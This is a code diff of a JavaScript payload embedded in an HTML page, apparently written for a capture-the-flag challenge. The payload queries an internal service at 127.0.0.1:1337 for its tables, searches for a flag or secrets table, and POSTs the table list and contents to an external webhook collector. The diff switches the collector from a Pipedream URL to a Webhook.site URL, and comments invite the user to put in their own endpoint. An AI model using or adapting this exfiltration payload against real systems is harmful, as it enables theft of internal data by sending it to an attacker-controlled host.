@@ -12,8 +12,8 @@
         fetch('http://127.0.0.1:1337/tables')
             .then(response => response.text())
             .then(data => {
-                // Send the tables list to RequestBin
-                sendToRequestBin('tables_data', data);
+                // Send the tables list to Webhook.site
+                sendToWebhook('tables_data', data);
 
                 // Parse the tables to find a likely flag table (e.g., 'flags', 'secrets')
                 let tables = JSON.parse(data).tables;
@@ -28,23 +28,23 @@
                     })
                     .then(res => res.text())
                     .then(tableData => {
-                        // Send the table contents to RequestBin
-                        sendToRequestBin('table_contents', tableData);
+                        // Send the table contents to Webhook.site
+                        sendToWebhook('table_contents', tableData);
                     })
                     .catch(err => console.error('Table fetch error:', err));
                 }
             })
             .catch(err => console.error('Tables fetch error:', err));
 
-        // Function to send data to RequestBin
-        function sendToRequestBin(key, value) {
-            fetch('https://eoi9s074jcny7f1.m.pipedream.net', {  // Replace with your RequestBin URL
+        // Function to send data to Webhook.site
+        function sendToWebhook(key, value) {
+            fetch('https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84', {  // Replace with your Webhook.site URL
                 method: 'POST',
                 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                 body: `${key}=${encodeURIComponent(value)}`
             })
-            .then(() => console.log(`Sent ${key} to RequestBin`))
-            .catch(err => console.error('RequestBin error:', err));
+            .then(() => console.log(`Sent ${key} to Webhook.site`))
+            .catch(err => console.error('Webhook error:', err));
         }
     </script>
 </body>
